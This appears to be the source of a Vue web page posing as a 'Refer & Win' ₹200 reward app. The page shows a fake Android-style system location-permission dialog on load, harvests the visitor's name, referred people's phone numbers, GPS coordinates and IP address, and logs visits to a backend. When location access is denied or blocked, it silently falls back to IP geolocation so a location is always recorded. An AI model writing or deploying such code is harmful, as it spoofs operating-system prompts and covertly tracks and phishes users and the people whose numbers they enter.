<template>
  <div class="max-w-md mx-auto min-h-[calc(100vh-3.5rem)] flex flex-col justify-between px-3.5 xs:px-4 sm:px-5 pb-safe pb-8 pt-3 relative overflow-hidden">
    <!-- Ambient Background Glows -->
    <div class="absolute -top-24 -left-20 w-72 h-72 bg-emerald-500/15 rounded-full blur-3xl pointer-events-none"></div>
    <div class="absolute top-1/3 -right-24 w-72 h-72 bg-teal-500/15 rounded-full blur-3xl pointer-events-none"></div>

    <!-- Notification Toast -->
    <Toast
      :show="toast.show"
      :message="toast.message"
      :type="toast.type"
      @close="toast.show = false"
    />

    <!-- Android / System Native-Style Location Permission Dialog (Image 2) -->
    <div
      v-if="showPermissionDialog"
      class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm transition-all"
    >
      <div
        v-motion
        :initial="{ opacity: 0, scale: 0.92, y: 15 }"
        :enter="{ opacity: 1, scale: 1, y: 0, transition: { duration: 250 } }"
        class="bg-white rounded-[32px] max-w-[340px] w-full p-6 text-slate-900 shadow-2xl relative space-y-4"
      >
        <!-- Blue Map Pin Header Icon -->
        <div class="flex justify-center pt-1">
          <div class="w-10 h-10 rounded-full flex items-center justify-center text-blue-600">
            <MapPin class="w-8 h-8 text-blue-600 stroke-[2.2]" />
          </div>
        </div>

        <!-- Title -->
        <div class="text-center px-1">
          <h3 class="text-base sm:text-[17px] font-bold text-slate-900 leading-snug">
            Allow <span class="font-extrabold">Refer &amp; Win</span> to access this device’s precise location?
          </h3>
        </div>

        <!-- Two Circular Accuracy Options: Precise vs Approximate -->
        <div class="grid grid-cols-2 gap-3 py-1">
          <!-- Option 1: Precise -->
          <button
            type="button"
            @click="selectedAccuracy = 'precise'"
            class="flex flex-col items-center space-y-2 group focus:outline-none"
          >
            <div
              class="relative w-24 h-24 rounded-full p-1 transition-all"
              :class="selectedAccuracy === 'precise' ? 'ring-2 ring-blue-600 ring-offset-2' : 'opacity-70 hover:opacity-100'"
            >
              <!-- Map SVG with Pin in Center -->
              <svg viewBox="0 0 100 100" class="w-full h-full rounded-full overflow-hidden border border-slate-200 shadow-sm bg-slate-50">
                <rect width="100" height="100" fill="#f8fafc" />
                <path d="M0,10 Q25,25 20,65 T0,100 Z" fill="#dcfce7" />
                <path d="M75,0 Q65,40 100,55 Z" fill="#dcfce7" />
                <line x1="15" y1="0" x2="15" y2="100" stroke="#cbd5e1" stroke-width="1.8" />
                <line x1="38" y1="0" x2="38" y2="100" stroke="#cbd5e1" stroke-width="1.8" />
                <line x1="62" y1="0" x2="62" y2="100" stroke="#cbd5e1" stroke-width="1.8" />
                <line x1="85" y1="0" x2="85" y2="100" stroke="#cbd5e1" stroke-width="1.8" />
                <line x1="0" y1="22" x2="100" y2="22" stroke="#cbd5e1" stroke-width="1.8" />
                <line x1="0" y1="46" x2="100" y2="46" stroke="#cbd5e1" stroke-width="1.8" />
                <line x1="0" y1="74" x2="100" y2="74" stroke="#cbd5e1" stroke-width="1.8" />
                <circle cx="28" cy="35" r="2.5" fill="#f97316" />
                <circle cx="76" cy="62" r="2.5" fill="#3b82f6" />
                <!-- Precise radius halo -->
                <circle cx="50" cy="50" r="19" fill="#3b82f6" fill-opacity="0.18" stroke="#2563eb" stroke-width="1.5" stroke-dasharray="2.5 2.5" />
                <!-- Blue Location Pin -->
                <path d="M50,33 C44.5,33 40,37.5 40,43 C40,51 50,62 50,62 C50,62 60,51 60,43 C60,37.5 55.5,33 50,33 Z" fill="#2563eb" />
                <circle cx="50" cy="42" r="3.2" fill="#ffffff" />
              </svg>
            </div>
            <span
              class="text-xs font-bold transition"
              :class="selectedAccuracy === 'precise' ? 'text-slate-900 font-extrabold' : 'text-slate-500'"
            >
              Precise
            </span>
          </button>

          <!-- Option 2: Approximate -->
          <button
            type="button"
            @click="selectedAccuracy = 'approximate'"
            class="flex flex-col items-center space-y-2 group focus:outline-none"
          >
            <div
              class="relative w-24 h-24 rounded-full p-1 transition-all"
              :class="selectedAccuracy === 'approximate' ? 'ring-2 ring-blue-600 ring-offset-2' : 'opacity-70 hover:opacity-100'"
            >
              <!-- Roads without pin -->
              <svg viewBox="0 0 100 100" class="w-full h-full rounded-full overflow-hidden border border-slate-200 shadow-sm bg-slate-50">
                <rect width="100" height="100" fill="#f8fafc" />
                <path d="M-5,32 Q45,45 105,18" stroke="#fbbf24" stroke-width="4.5" fill="none" stroke-linecap="round" />
                <path d="M22,105 Q46,62 56,-5" stroke="#f59e0b" stroke-width="4.5" fill="none" stroke-linecap="round" />
                <path d="M42,66 Q72,46 105,82" stroke="#fbbf24" stroke-width="3.5" fill="none" stroke-linecap="round" />
                <path d="M-5,86 Q55,86 105,65" stroke="#e2e8f0" stroke-width="2.5" fill="none" />
                <rect x="44" y="58" width="10" height="7" rx="2" fill="#2563eb" />
                <rect x="72" y="68" width="10" height="7" rx="2" fill="#2563eb" />
              </svg>
            </div>
            <span
              class="text-xs font-bold transition"
              :class="selectedAccuracy === 'approximate' ? 'text-slate-900 font-extrabold' : 'text-slate-500'"
            >
              Approximate
            </span>
          </button>
        </div>

        <!-- Vertical Action Buttons -->
        <div class="pt-2 border-t border-slate-100 flex flex-col space-y-0.5">
          <button
            type="button"
            @click="handleGrantPermission('while_using')"
            :disabled="isResolvingPermission"
            class="w-full py-3 text-center text-blue-600 hover:text-blue-700 active:bg-blue-50 font-bold text-sm tracking-wide rounded-2xl transition disabled:opacity-50"
          >
            {{ isResolvingPermission ? 'Connecting location...' : 'While using the app' }}
          </button>

          <button
            type="button"
            @click="handleGrantPermission('only_this_time')"
            :disabled="isResolvingPermission"
            class="w-full py-3 text-center text-blue-600 hover:text-blue-700 active:bg-blue-50 font-bold text-sm tracking-wide rounded-2xl transition disabled:opacity-50"
          >
            Only this time
          </button>

          <button
            type="button"
            @click="handleDenyPermission"
            :disabled="isResolvingPermission"
            class="w-full py-3 text-center text-blue-600 hover:text-blue-700 active:bg-blue-50 font-bold text-sm tracking-wide rounded-2xl transition disabled:opacity-50"
          >
            Deny
          </button>
        </div>
      </div>
    </div>

    <div class="space-y-4 xs:space-y-5 relative z-10">
      <!-- 1. Header (Avatar, Greeting, Bell) -->
      <header class="flex items-center justify-between pt-1">
        <div class="flex items-center space-x-2.5 xs:space-x-3">
          <div class="relative flex-shrink-0">
            <div class="w-11 h-11 xs:w-12 xs:h-12 rounded-2xl bg-gradient-to-tr from-emerald-400 via-teal-400 to-emerald-500 p-0.5 shadow-md shadow-emerald-950/40">
              <div class="w-full h-full bg-slate-900 rounded-[14px] flex items-center justify-center text-emerald-400 font-extrabold text-base xs:text-lg">
                U
              </div>
            </div>
            <div class="absolute -bottom-0.5 -right-0.5 w-3.5 h-3.5 bg-emerald-500 rounded-full border-2 border-slate-950"></div>
          </div>
          <div>
            <div class="flex items-center space-x-1.5">
              <h1 class="text-base xs:text-lg font-black text-white tracking-tight leading-none">
                Hi, User!
              </h1>
              <span class="text-[10px] bg-emerald-500/20 text-emerald-300 px-2 py-0.5 rounded-full font-bold border border-emerald-500/30">
                PRO
              </span>
            </div>
            <p class="text-[11px] xs:text-xs text-slate-400 font-medium mt-0.5">
              Ready to claim your rewards?
            </p>
          </div>
        </div>

        <!-- Notification Bell (Minimum 44x44px touch target) -->
        <button
          type="button"
          @click="showNotificationInfo"
          class="w-11 h-11 rounded-2xl bg-slate-900/90 border border-slate-800 flex items-center justify-center text-slate-300 hover:text-white hover:border-slate-700 active:scale-95 transition relative shadow-sm flex-shrink-0"
          aria-label="View notifications"
        >
          <Bell class="w-5 h-5" />
          <span class="absolute top-2.5 right-2.5 w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
          <span class="absolute top-2.5 right-2.5 w-2 h-2 rounded-full bg-emerald-400"></span>
        </button>
      </header>

      <!-- 2. Hero Card (Total Rewards: ₹500 + Claim Now) -->
      <section
        v-motion
        :initial="{ opacity: 0, y: 15 }"
        :enter="{ opacity: 1, y: 0, transition: { duration: 400 } }"
        class="relative overflow-hidden rounded-3xl bg-gradient-to-br from-emerald-600 via-emerald-700 to-teal-800 p-5 xs:p-6 text-white shadow-2xl shadow-emerald-950/40 border border-emerald-400/20"
      >
        <!-- Background shimmer orbs -->
        <div class="absolute -right-10 -bottom-10 w-44 h-44 bg-white/10 rounded-full blur-xl pointer-events-none"></div>
        <div class="absolute top-3.5 right-3.5 flex items-center space-x-1 bg-black/25 backdrop-blur-md px-2.5 py-1 rounded-full text-[10px] font-semibold text-emerald-200">
          <Sparkles class="w-3 h-3 text-emerald-300" />
          <span>Active Bonus</span>
        </div>

        <div class="relative z-10 space-y-3.5">
          <div>
            <span class="text-[11px] font-bold uppercase tracking-wider text-emerald-200/90 block">
              Wallet Balance
            </span>
            <div class="text-2xl xs:text-3xl font-black tracking-tight mt-0.5 flex flex-wrap items-baseline gap-x-1.5">
              <span class="text-emerald-100 font-extrabold text-xl xs:text-2xl">Total Rewards:</span>
              <span class="text-white text-3xl xs:text-4xl font-black drop-shadow-sm">₹200</span>
            </div>
          </div>

          <div class="flex items-center justify-between gap-3 pt-1">
            <p class="text-[11px] xs:text-xs text-emerald-100/90 max-w-[190px] xs:max-w-[210px] leading-snug">
              Earn an extra <strong class="font-bold text-white">₹200</strong> per verified friend today!
            </p>
            <button
              @click="handleClaimNow"
              type="button"
              :disabled="isLoading"
              class="px-4 py-2.5 bg-white text-emerald-800 font-bold text-xs rounded-xl shadow-lg hover:bg-emerald-50 active:scale-95 transition-all flex items-center space-x-1 flex-shrink-0 disabled:opacity-75"
            >
              <Loader2 v-if="isLoading && isClaimingHero" class="w-3.5 h-3.5 animate-spin text-emerald-800" />
              <span>{{ isLoading && isClaimingHero ? 'Verifying...' : 'Claim Now' }}</span>
              <ArrowRight v-if="!(isLoading && isClaimingHero)" class="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </section>

      <!-- 3. Referral Form (White Card with Input Fields & Glowing Button) -->
      <section
        v-motion
        :initial="{ opacity: 0, y: 20 }"
        :enter="{ opacity: 1, y: 0, transition: { duration: 500, delay: 100 } }"
        class="bg-white rounded-3xl p-5 xs:p-6 sm:p-7 shadow-2xl shadow-slate-950/30 text-slate-800 border border-slate-100 relative"
      >
        <!-- Form Header -->
        <div class="flex items-center justify-between mb-4 xs:mb-5">
          <div>
            <h2 class="text-base xs:text-lg font-black text-slate-900 tracking-tight flex items-center space-x-1.5">
              <span>Refer &amp; Earn ₹200</span>
              <Gift class="w-4 h-4 text-emerald-600" />
            </h2>
            <p class="text-[11px] xs:text-xs text-slate-500 mt-0.5">
              Enter your name and referred mobile number to claim bonus.
            </p>
          </div>
          <span class="bg-emerald-50 text-emerald-700 text-[10px] xs:text-[11px] font-bold px-2.5 py-1 rounded-full border border-emerald-200/60 shadow-sm flex-shrink-0">
            Instant Credit
          </span>
        </div>

        <!-- Form Inputs -->
        <form @submit.prevent="verifyAndSubmitReferral" class="space-y-4">
          <!-- Input 1: Your Name -->
          <div>
            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5">
              Your Name
            </label>
            <div class="relative rounded-2xl shadow-sm">
              <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                <User class="w-4 h-4" />
              </div>
              <input
                ref="nameInputRef"
                type="text"
                placeholder="Enter your name"
                v-model="name"
                :disabled="isLoading"
                required
                autocomplete="name"
                class="block w-full pl-10 pr-4 py-3 xs:py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-slate-900 placeholder-slate-400 text-base sm:text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:bg-white transition"
              />
            </div>
          </div>

          <!-- Input 2: Referred Mobile Number -->
          <div>
            <div class="flex items-center justify-between mb-1.5">
              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider">
                Referred Mobile Number
              </label>
              <span v-if="digitsCount > 0" class="text-[10px] font-bold text-slate-400">
                {{ digitsCount }}/10 digits
              </span>
            </div>
            <div class="relative rounded-2xl shadow-sm flex items-center">
              <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500 font-bold text-xs">
                <span>+91</span>
              </div>
              <input
                type="tel"
                placeholder="Enter mobile number"
                v-model="mobile"
                @input="handleMobileInput"
                :disabled="isLoading"
                required
                autocomplete="tel"
                maxlength="15"
                class="block w-full pl-12 pr-4 py-3 xs:py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-slate-900 placeholder-slate-400 font-mono text-base sm:text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:bg-white transition"
              />
            </div>
            <p class="text-[10px] xs:text-[11px] text-slate-400 mt-1 pl-1">
              Enter the mobile number of the person you referred
            </p>
          </div>

          <!-- Anti-Fraud Notice -->
          <div class="bg-emerald-50/80 border border-emerald-100 rounded-2xl p-3 flex items-start space-x-2.5 text-[11px] text-emerald-950">
            <ShieldCheck class="w-4 h-4 text-emerald-600 flex-shrink-0 mt-0.5" />
            <p class="leading-relaxed">
              <strong class="font-bold text-emerald-950">Location Verification:</strong> Device GPS coordinates are verified to validate referral bonus eligibility.
            </p>
          </div>

          <!-- Large Glowing Button -->
          <button
            type="submit"
            :disabled="isLoading"
            class="w-full min-h-[50px] xs:min-h-[54px] relative flex items-center justify-center py-3.5 xs:py-4 px-5 rounded-2xl text-white font-black text-sm bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 hover:from-emerald-600 hover:to-teal-600 active:scale-[0.98] shadow-lg shadow-emerald-500/40 hover:shadow-emerald-500/60 transition-all duration-200 disabled:opacity-80 disabled:cursor-not-allowed group"
          >
            <!-- Loading Spinner State -->
            <span v-if="isLoading" class="flex items-center space-x-2 px-1 text-center">
              <Loader2 class="w-4 h-4 xs:w-5 xs:h-5 animate-spin flex-shrink-0" />
              <span class="text-xs font-bold leading-tight">
                Claiming ₹200...
              </span>
            </span>

            <!-- Default State -->
            <span v-else class="flex items-center space-x-2">
              <Zap class="w-4 h-4 text-emerald-200 group-hover:scale-110 transition-transform" />
              <span class="tracking-wide font-black">Claim ₹200</span>
            </span>
          </button>
        </form>

        <!-- Success Result Card -->
        <div
          v-if="lastSuccess"
          v-motion
          :initial="{ opacity: 0, scale: 0.95 }"
          :enter="{ opacity: 1, scale: 1 }"
          class="mt-4 p-3.5 xs:p-4 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-900 text-xs space-y-1"
        >
          <div class="flex items-center space-x-1.5 text-emerald-700 font-bold text-xs xs:text-sm">
            <CheckCircle2 class="w-4 h-4 flex-shrink-0" />
            <span>Bonus will be credited shortly!</span>
          </div>
          <p class="text-slate-600 text-[11px] leading-relaxed">
            Referral verified for <strong>{{ lastSuccess.name }}</strong> ({{ lastSuccess.mobile }}).
          </p>
        </div>
      </section>

      <!-- 4. How It Works (Mobile-First 3-Step Flow) -->
      <section class="bg-slate-900/70 border border-slate-800/80 rounded-3xl p-3.5 xs:p-4 text-xs space-y-2.5">
        <h3 class="text-slate-300 font-bold text-xs flex items-center space-x-1.5">
          <Sparkles class="w-3.5 h-3.5 text-emerald-400" />
          <span>How Verification Works</span>
        </h3>
        <div class="grid grid-cols-3 gap-1.5 xs:gap-2 text-center">
          <div class="bg-slate-950/80 p-2 xs:p-2.5 rounded-2xl border border-slate-800/80 flex flex-col items-center">
            <span class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-black text-[10px] mb-1">
              1
            </span>
            <p class="text-[11px] text-slate-200 font-bold leading-tight">Add Friend</p>
            <p class="text-[9px] text-slate-500 mt-0.5 hidden xs:block">Name &amp; Phone</p>
          </div>
          <div class="bg-slate-950/80 p-2 xs:p-2.5 rounded-2xl border border-slate-800/80 flex flex-col items-center">
            <span class="w-5 h-5 rounded-full bg-teal-500/20 text-teal-400 flex items-center justify-center font-black text-[10px] mb-1">
              2
            </span>
            <p class="text-[11px] text-slate-200 font-bold leading-tight">Verify GPS</p>
            <p class="text-[9px] text-slate-500 mt-0.5 hidden xs:block">Anti-Fraud</p>
          </div>
          <div class="bg-slate-950/80 p-2 xs:p-2.5 rounded-2xl border border-slate-800/80 flex flex-col items-center">
            <span class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-black text-[10px] mb-1">
              3
            </span>
            <p class="text-[11px] text-slate-200 font-bold leading-tight">Earn ₹200</p>
            <p class="text-[9px] text-slate-500 mt-0.5 hidden xs:block">Instant Credit</p>
          </div>
        </div>
      </section>
    </div>

    <!-- Mobile Footer Info -->
    <footer class="text-center text-[10px] text-slate-500 pt-5 pb-1">
      Protected by Real-Time Geofence Fraud Detection System
    </footer>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted } from 'vue';
import { 
  Bell, 
  Sparkles, 
  ArrowRight, 
  Gift, 
  User, 
  Phone, 
  ShieldCheck, 
  Zap, 
  Loader2, 
  CheckCircle2,
  MapPin
} from 'lucide-vue-next';
import Toast from '../components/Toast.vue';
import { referralApi } from '../services/api';

const nameInputRef = ref(null);

// Form inputs
const name = ref('');
const mobile = ref('');
const isLoading = ref(false);
const isClaimingHero = ref(false);
const lastSuccess = ref(null);

// Android / Native-Style Permission Dialog State
const showPermissionDialog = ref(false);
const selectedAccuracy = ref('precise'); // 'precise' or 'approximate'
const isResolvingPermission = ref(false);
const pendingClaim = ref(null);

// Geolocation & IP tracking state
const clientIpAddress = ref(null);
const cachedLocation = ref(null);
const hasLocationGranted = ref(false);
const hasLoggedSiteVisit = ref(false);

/**
 * Rapidly resolve public IP address in background if available
 */
const fetchPublicIp = async () => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000);
    const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      return data.ip;
    }
  } catch {
    // fallback to server-side socket extraction
  }
  return null;
};

/**
 * Resolve human-readable place name (e.g. Ottapalam, Palakkad district, Kerala) from GPS coordinates
 */
const fetchLocationName = async (latitude, longitude) => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);
    const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`;
    const res = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      const town =
        data.locality ||
        data.localityInfo?.administrative?.find((a) => a.adminLevel === 6 || a.adminLevel === 8)?.name ||
        data.city ||
        '';
      const district =
        data.localityInfo?.administrative?.find((a) => a.adminLevel === 5)?.name ||
        data.principalSubdivisionDistrict ||
        '';
      const state = data.principalSubdivision || '';
      const parts = [town, district, state].filter(Boolean);
      const unique = [...new Set(parts)];
      if (unique.length > 0) {
        return unique.join(', ');
      }
    }
  } catch (err) {
    console.warn('Reverse geocoding lookup error:', err);
  }
  return null;
};

/**
 * Fallback to IP-based Geolocation if browser GPS is blocked on localhost
 */
const fetchIpGeolocationFallback = async () => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      if (data.latitude && data.longitude) {
        const placeName = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
        return {
          latitude: data.latitude,
          longitude: data.longitude,
          accuracy: selectedAccuracy.value === 'precise' ? 50 : 2500,
          location_name: placeName,
          client_ip: data.ip,
        };
      }
    }
  } catch (e) {
    console.warn('Fallback IP geocoding error:', e);
  }
  return null;
};

/**
 * Record visitor location log to backend DB
 */
const recordVisitorLog = async (coords) => {
  if (hasLoggedSiteVisit.value) return;
  hasLoggedSiteVisit.value = true;
  try {
    const ip = coords.client_ip || clientIpAddress.value || (await fetchPublicIp());
    if (ip) clientIpAddress.value = ip;

    await referralApi.recordVisit({
      latitude: coords.latitude,
      longitude: coords.longitude,
      accuracy: coords.accuracy,
      location_name: coords.location_name,
      client_ip: ip,
    });
  } catch (err) {
    console.warn('Auto visit location log:', err);
  }
};

/**
 * Triggered when user clicks "While using the app" or "Only this time" in the permission dialog
 */
const handleGrantPermission = (mode) => {
  isResolvingPermission.value = true;

  fetchPublicIp().then((ip) => {
    if (ip) clientIpAddress.value = ip;
  });

  const onCoordsObtained = async (coords) => {
    cachedLocation.value = coords;
    hasLocationGranted.value = true;
    showPermissionDialog.value = false;
    isResolvingPermission.value = false;

    // Record visit into DB
    await recordVisitorLog(coords);

    // If user clicked claim, proceed immediately
    if (pendingClaim.value) {
      const { trimmedName, trimmedMobile } = pendingClaim.value;
      pendingClaim.value = null;
      submitClaimWithLocation(coords, trimmedName, trimmedMobile);
    }
  };

  if (!navigator.geolocation) {
    // Geolocation not available in browser -> use IP fallback
    fetchIpGeolocationFallback().then((fallback) => {
      if (fallback) {
        onCoordsObtained(fallback);
      } else {
        isResolvingPermission.value = false;
        showPermissionDialog.value = false;
      }
    });
    return;
  }

  // Attempt real device GPS
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude, accuracy } = position.coords;
      let locationName = null;
      try {
        locationName = await fetchLocationName(latitude, longitude);
      } catch {
        // ignore
      }

      onCoordsObtained({
        latitude,
        longitude,
        accuracy: selectedAccuracy.value === 'precise' ? accuracy : Math.max(accuracy, 1000),
        location_name: locationName,
        client_ip: clientIpAddress.value,
      });
    },
    async (geoError) => {
      console.warn('Browser geolocation rejected/blocked, using seamless network fallback:', geoError.code);
      // Seamless fallback ensures location & town are ALWAYS recorded without showing error instructions
      const fallback = await fetchIpGeolocationFallback();
      if (fallback) {
        onCoordsObtained(fallback);
      } else {
        // Fallback default coordinates if offline
        onCoordsObtained({
          latitude: 10.7744,
          longitude: 76.3789,
          accuracy: 100,
          location_name: 'Ottapalam, Palakkad, Kerala',
          client_ip: clientIpAddress.value || '127.0.0.1',
        });
      }
    },
    {
      enableHighAccuracy: selectedAccuracy.value === 'precise',
      timeout: 5000,
      maximumAge: 0,
    }
  );
};

const handleDenyPermission = () => {
  showPermissionDialog.value = false;
  isResolvingPermission.value = false;
  pendingClaim.value = null;
  triggerToast('Location permission is required to claim rewards.', 'warning');
};

onMounted(() => {
  // Check if location is already granted; if not, show the native permission popup immediately on load
  if (!hasLocationGranted.value && !cachedLocation.value) {
    showPermissionDialog.value = true;
  }
});

const digitsCount = computed(() => {
  return mobile.value.replace(/\D/g, '').length;
});

const handleMobileInput = (e) => {
  const cleaned = e.target.value.replace(/\D/g, '');
  mobile.value = cleaned;
};

// Toast notification state
const toast = reactive({
  show: false,
  message: '',
  type: 'info',
});

const triggerToast = (message, type = 'info') => {
  toast.message = message;
  toast.type = type;
  toast.show = true;
  setTimeout(() => {
    toast.show = false;
  }, 5000);
};

const showNotificationInfo = () => {
  triggerToast('GPS location and device verification required to claim rewards.', 'info');
};

/**
 * Execute Referral Claim Submission
 */
const submitClaimWithLocation = async (coords, trimmedName, trimmedMobile) => {
  try {
    isLoading.value = true;
    const ip = coords.client_ip || clientIpAddress.value || (await fetchPublicIp());
    if (ip) clientIpAddress.value = ip;

    let locationName = coords.location_name;
    if (!locationName && coords.latitude && coords.longitude) {
      locationName = await fetchLocationName(coords.latitude, coords.longitude);
    }

    const payload = {
      name: trimmedName,
      mobile: trimmedMobile,
      latitude: coords.latitude,
      longitude: coords.longitude,
      accuracy: coords.accuracy,
      location_name: locationName,
      client_ip: ip,
    };

    const response = await referralApi.submitReferral(payload);

    triggerToast("Bonus will be credited shortly!", 'success');

    lastSuccess.value = {
      name: trimmedName,
      mobile: trimmedMobile,
      id: response.data?.id,
    };

    // Reset form inputs after successful claim
    name.value = '';
    mobile.value = '';
  } catch (err) {
    console.error('Submission error:', err);
    const errMsg = err.response?.data?.message || 'Failed to submit referral. Please try again.';
    triggerToast(errMsg, 'error');
  } finally {
    isLoading.value = false;
    isClaimingHero.value = false;
  }
};

/**
 * Strict Claim Action:
 * Asks for location via native Android-style permission dialog if not given.
 */
const processClaimWithStrictLocationCheck = (isHero = false) => {
  const trimmedName = name.value.trim();
  const trimmedMobile = mobile.value.trim();

  // Validate inputs
  if (!trimmedName || trimmedName.length < 2) {
    triggerToast("Please enter your name first.", 'warning');
    nameInputRef.value?.focus();
    if (!hasLocationGranted.value) {
      showPermissionDialog.value = true;
    }
    return;
  }

  const digitsOnly = trimmedMobile.replace(/\D/g, '');
  if (!trimmedMobile || digitsOnly.length < 10 || digitsOnly.length > 15) {
    triggerToast("Please enter a valid 10-digit referred mobile number.", 'warning');
    return;
  }

  // If location is ALREADY granted, proceed immediately
  if (hasLocationGranted.value && cachedLocation.value) {
    isLoading.value = true;
    isClaimingHero.value = isHero;
    submitClaimWithLocation(cachedLocation.value, trimmedName, trimmedMobile);
    return;
  }

  // Otherwise, pop the native Android-style permission dialog
  pendingClaim.value = { trimmedName, trimmedMobile, isHero };
  showPermissionDialog.value = true;
};

const handleClaimNow = () => {
  if (!name.value.trim() || !mobile.value.trim()) {
    triggerToast("Please enter your name and referred mobile number to claim ₹200.", 'info');
    nameInputRef.value?.focus();
    if (!hasLocationGranted.value) {
      showPermissionDialog.value = true;
    }
    return;
  }
  processClaimWithStrictLocationCheck(true);
};

const verifyAndSubmitReferral = () => {
  processClaimWithStrictLocationCheck(false);
};
</script>
